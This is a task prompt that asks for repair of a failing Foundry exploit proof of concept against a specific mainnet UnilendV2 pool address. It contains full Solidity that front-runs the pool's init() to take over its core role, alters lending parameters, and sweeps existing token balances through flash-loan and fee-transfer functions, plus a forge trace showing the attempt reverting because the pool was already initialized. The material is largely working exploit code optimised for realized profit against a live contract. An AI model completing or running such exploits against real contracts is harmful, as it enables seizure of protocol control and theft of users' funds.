You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can front-run initialization and permanently seize an uninitialized pool
- claim: `init()` is a one-time external initializer with no access control. On any freshly deployed pool, any address can call it first, choose arbitrary `token0`, `token1`, `interestRateAddress`, `ltv/lb/rf`, and overwrite `core` with an attacker-controlled address. Because privileged functions are gated only by `onlyCore`, the attacker permanently becomes the pool controller.
- impact: If deployment and initialization are not atomic, a front-runner can seize the pool before the intended deployer initializes it. Once in control, the attacker can route all `onlyCore` operations through an attacker-controlled core, use malicious oracle responses, and directly transfer out any assets later sent to the pool via privileged flows such as `processFlashLoan`, leading to theft or permanent pool bricking.
- exploit_paths: ["A pool is deployed but remains uninitialized for at least one transaction.", "An attacker calls `init()` first and sets `core` to an attacker-controlled address or contract.", "The legitimate initializer is locked out by `initialized = true`.", "Any funds later routed into the pool can be drained or the market can be permanently misconfigured via the attacker-controlled `onlyCore` entrypoints."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface ITargetPool {
    function init(address _token0, address _token1, address _interestRate, uint8 _ltv, uint8 _lb, uint8 _rf) external;
    function processFlashLoan(address _receiver, int256 _amount) external;
    function transferFlashLoanProtocolFee(address _distributorAddress, address _token, uint256 _amount) external;
    function setInterestRateAddress(address _address) external;
    function setLTV(uint8 _number) external;
    function setLB(uint8 _number) external;
    function setRF(uint8 _number) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function core() external view returns (address);
}

contract LateInitializerProbe {
    function attempt(
        address target,
        address token0,
        address token1,
        address interestRate,
        uint8 ltv,
        uint8 lb,
        uint8 rf
    ) external returns (bool success, bytes memory revertData) {
        (success, revertData) = target.call(
            abi.encodeWithSelector(
                ITargetPool.init.selector,
                token0,
                token1,
                interestRate,
                ltv,
                lb,
                rf
            )
        );
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WSTETH = 0x7f39c581F595b53C5cB5bEdEa0DFFd6a935E2cA0;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;

    bytes4 private constant ERROR_SELECTOR = 0x08c379a0;
    bytes32 private constant POOL_ALREADY_INIT_HASH = keccak256(bytes("UnilendV2: POOL ALREADY INIT"));

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executeCalled;
    bool public seizeAttempted;
    bool public seized;
    bool public hostileInitSucceeded;

    bool public lateInitializerAttempted;
    bool public lateInitializerRejected;
    bool public lockoutCausedByInitFlag;
    bool public initializerLockedOut;

    bool public privilegeMutationAttempted;
    bool public privilegeMutationProved;
    bool public drainAttempted;
    bool public profitAchieved;
    bool public hypothesisValidated;

    bool public path0_uninitializedWindow;
    bool public path1_hostileInitFirst;
    bool public path2_legitimateInitializerLockedOut;
    bool public path3_privilegedDrainOrMisconfig;

    uint8 public failureCode;
    // 0: no terminal failure
    // 1: target was already initialized at fork block, so the front-run path is unavailable on-chain
    // 2: hostile init and lockout succeeded, but the fork holds no tracked drainable balances
    // 3: hostile init succeeded, but a later initializer was not blocked by the one-time init flag
    // 4: hostile init succeeded, but privileged mutation proof failed

    address public selectedToken0;
    address public selectedToken1;
    address public lateInitAttemptInterestRate;

    LateInitializerProbe private _lateInitializer;

    constructor() {}

    function executeOnOpportunity() external {
        executeCalled = true;

        if (!seizeAttempted) {
            _stage0And1_frontRunInit();
        }
        if (!hostileInitSucceeded) {
            return;
        }

        if (!lateInitializerAttempted) {
            _stage2_proveLegitimateInitializerLockedOut();
        }
        if (!path2_legitimateInitializerLockedOut) {
            if (failureCode == 0) {
                failureCode = 3;
            }
            return;
        }

        if (!privilegeMutationAttempted) {
            _stage3_misconfigureAndDrain();
        }
    }

    // Exploit path 0: a pool is deployed but remains uninitialized for at least one transaction.
    // Exploit path 1: an attacker calls init() first and installs attacker-controlled settings/core.
    function _stage0And1_frontRunInit() internal {
        seizeAttempted = true;

        (address initToken0, address initToken1) = _pickInitializationAssets();
        selectedToken0 = initToken0;
        selectedToken1 = initToken1;

        (bool success, bytes memory revertData) = TARGET.call(
            abi.encodeWithSelector(
                ITargetPool.init.selector,
                initToken0,
                initToken1,
                address(this),
                uint8(100),
                uint8(0),
                uint8(0)
            )
        );

        if (!success) {
            if (_isPoolAlreadyInitRevert(revertData)) {
                failureCode = 1;
            }
            return;
        }

        bool controlsTarget = _attackerControlsTarget();
        bool installedAssets = _selectedAssetsInstalled(initToken0, initToken1);
        hostileInitSucceeded = controlsTarget && installedAssets;
        seized = hostileInitSucceeded;

        if (hostileInitSucceeded) {
            path0_uninitializedWindow = true;
            path1_hostileInitFirst = true;
            hypothesisValidated = true;
        }
    }

    // Exploit path 2: the legitimate initializer is locked out by initialized = true.
    // A distinct helper contract simulates the later legitimate initializer trying to call init().
    function _stage2_proveLegitimateInitializerLockedOut() internal {
        lateInitializerAttempted = true;

        if (address(_lateInitializer) == address(0)) {
            _lateInitializer = new LateInitializerProbe();
        }

        lateInitAttemptInterestRate = address(this);

        (bool success, bytes memory revertData) = _lateInitializer.attempt(
            TARGET,
            DAI,
            USDT,
            lateInitAttemptInterestRate,
            1,
            1,
            1
        );

        lateInitializerRejected = !success;
        lockoutCausedByInitFlag = lateInitializerRejected && _isPoolAlreadyInitRevert(revertData);
        initializerLockedOut = lateInitializerRejected && lockoutCausedByInitFlag && _attackerControlsTarget();
        path2_legitimateInitializerLockedOut = initializerLockedOut;

        if (initializerLockedOut) {
            hypothesisValidated = true;
        }
    }

    // Exploit path 3: once core control is seized, onlyCore operations can misconfigure the market
    // and transfer out assets already sitting in the pool. The drain uses existing pool balances first,
    // which matches the required direct_or_existing_balance_first strategy.
    function _stage3_misconfigureAndDrain() internal {
        privilegeMutationAttempted = true;

        _provePrivilegedControl();
        if (!privilegeMutationProved) {
            if (failureCode == 0) {
                failureCode = 4;
            }
            return;
        }

        _drainTargetBalances();
    }

    function _provePrivilegedControl() internal {
        // Root cause preservation: attacker first wins init(), which sets core = attacker.
        // From there the pool's onlyCore setters are publicly reachable through the hostile core.
        try ITargetPool(TARGET).setInterestRateAddress(address(this)) {
            try ITargetPool(TARGET).setLTV(1) {
                try ITargetPool(TARGET).setLB(1) {
                    try ITargetPool(TARGET).setRF(1) {
                        privilegeMutationProved = _attackerControlsTarget();
                    } catch {}
                } catch {}
            } catch {}
        } catch {}

        if (privilegeMutationProved) {
            path3_privilegedDrainOrMisconfig = true;
            hypothesisValidated = true;
        }
    }

    function _drainTargetBalances() internal {
        drainAttempted = true;

        // First try the pool's token0/token1 flash-loan transfer path using whatever balances already
        // exist at the target. This adds no synthetic funding and preserves the exploit's causality.
        _drainChosenToken(selectedToken0, true);
        _drainChosenToken(selectedToken1, false);

        // Then sweep any other existing balances through the protocol-fee transfer path, which is
        // another attacker-controlled onlyCore entrypoint after hostile initialization.
        _drainArbitraryToken(WETH);
        _drainArbitraryToken(USDC);
        _drainArbitraryToken(USDT);
        _drainArbitraryToken(DAI);
        _drainArbitraryToken(WBTC);
        _drainArbitraryToken(CBBTC);
        _drainArbitraryToken(STETH);
        _drainArbitraryToken(WSTETH);
        _drainArbitraryToken(LDO);
        _drainArbitraryToken(LINK);
        _drainArbitraryToken(UNI);
        _drainArbitraryToken(AAVE);
        _drainArbitraryToken(CRV);
        _drainArbitraryToken(MKR);
        _drainArbitraryToken(COMP);

        if (_profitAmount > 0) {
            profitAchieved = true;
            path3_privilegedDrainOrMisconfig = true;
            hypothesisValidated = true;
        } else if (failureCode == 0) {
            failureCode = 2;
        }
    }

    function _pickInitializationAssets() internal view returns (address best0, address best1) {
        address[15] memory candidates = [
            WETH,
            USDC,
            USDT,
            DAI,
            WBTC,
            CBBTC,
            STETH,
            WSTETH,
            LDO,
            LINK,
            UNI,
            AAVE,
            CRV,
            MKR,
            COMP
        ];

        uint256 bestBal0;
        uint256 bestBal1;

        for (uint256 i = 0; i < candidates.length; i++) {
            address candidate = candidates[i];
            uint256 bal = _safeBalanceOf(candidate, TARGET);

            if (bal > bestBal0) {
                bestBal1 = bestBal0;
                best1 = best0;
                bestBal0 = bal;
                best0 = candidate;
            } else if (candidate != best0 && bal > bestBal1) {
                bestBal1 = bal;
                best1 = candidate;
            }
        }

        if (best0 == address(0)) {
            best0 = WETH;
        }
        if (best1 == address(0) || best1 == best0) {
            best1 = best0 == WETH ? USDC : WETH;
        }
    }

    function _drainChosenToken(address token, bool useToken0Side) internal {
        if (token == address(0)) {
            return;
        }

        uint256 poolBalance = _safeBalanceOf(token, TARGET);
        if (poolBalance == 0 || poolBalance > uint256(type(int256).max)) {
            return;
        }

        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        int256 signedAmount = useToken0Side ? -int256(poolBalance) : int256(poolBalance);

        try ITargetPool(TARGET).processFlashLoan(address(this), signedAmount) {
            uint256 afterBalance = _safeBalanceOf(token, address(this));
            uint256 realized = afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
            _recordProfit(token, realized);
        } catch {}
    }

    function _drainArbitraryToken(address token) internal {
        if (token == address(0)) {
            return;
        }

        uint256 poolBalance = _safeBalanceOf(token, TARGET);
        if (poolBalance == 0) {
            return;
        }

        uint256 beforeBalance = _safeBalanceOf(token, address(this));

        try ITargetPool(TARGET).transferFlashLoanProtocolFee(address(this), token, poolBalance) {
            uint256 afterBalance = _safeBalanceOf(token, address(this));
            uint256 realized = afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
            _recordProfit(token, realized);
        } catch {}
    }

    function _attackerControlsTarget() internal view returns (bool) {
        try ITargetPool(TARGET).core() returns (address liveCore) {
            return liveCore == address(this);
        } catch {
            return false;
        }
    }

    function _selectedAssetsInstalled(address expected0, address expected1) internal view returns (bool) {
        address live0;
        address live1;

        try ITargetPool(TARGET).token0() returns (address token0_) {
            live0 = token0_;
        } catch {
            return false;
        }

        try ITargetPool(TARGET).token1() returns (address token1_) {
            live1 = token1_;
        } catch {
            return false;
        }

        return live0 == expected0 && live1 == expected1;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _recordProfit(address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        if (_profitAmount == 0) {
            _profitToken = token;
            _profitAmount = amount;
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            return;
        }

        if (amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
        }
    }

    function _isPoolAlreadyInitRevert(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 68) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }
        if (selector != ERROR_SELECTOR) {
            return false;
        }

        bytes memory payload = _slice(revertData, 4);
        string memory reason = abi.decode(payload, (string));
        return keccak256(bytes(reason)) == POOL_ALREADY_INIT_HASH;
    }

    function _slice(bytes memory data, uint256 start) internal pure returns (bytes memory out) {
        if (data.length < start) {
            return out;
        }

        uint256 newLength = data.length - start;
        out = new bytes(newLength);
        for (uint256 i = 0; i < newLength; i++) {
            out[i] = data[start + i];
        }
    }

    function getCurrentInterestRate(uint256, uint256) external pure returns (uint256) {
        return 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
all]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [252095] FlawVerifier::executeOnOpportunity()
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9839] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [delegatecall]
    │   │   │   └─ ← [Return] 728895404 [7.288e8]
    │   │   └─ ← [Return] 728895404 [7.288e8]
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9785] 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   ├─ [2553] 0x7458bfDC30034EB860B265E6068121D18Fa5Aa72::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [33852] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [14972] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [delegatecall]
    │   │   │   └─ ← [Return] 60672854905837671913 [6.067e19]
    │   │   └─ ← [Return] 60672854905837671913 [6.067e19]
    │   ├─ [0] 0x7f39c581F595b53C5cB5bEdEa0DFFd6a935E2cA0::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [4823] 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9873] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   ├─ [2638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2715] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2788] 0xc00e94Cb662C3520282E6f5717214004A7f26888::balanceOf(0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5739] 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0::init(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100, 0, 0)
    │   │   ├─ [3029] 0xc86D2555F8c360D3C5E8e4364F42c1f2d169330E::init(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100, 0, 0) [delegatecall]
    │   │   │   └─ ← [Revert] UnilendV2: POOL ALREADY INIT
    │   │   └─ ← [Revert] UnilendV2: POOL ALREADY INIT
    │   └─ ← [Stop]
    ├─ [481] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc86D2555F8c360D3C5E8e4364F42c1f2d169330E.init
  at 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0.init
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.25s (109.41ms CPU time)

Ran 1 test suite in 1.37s (1.25s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 277747)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
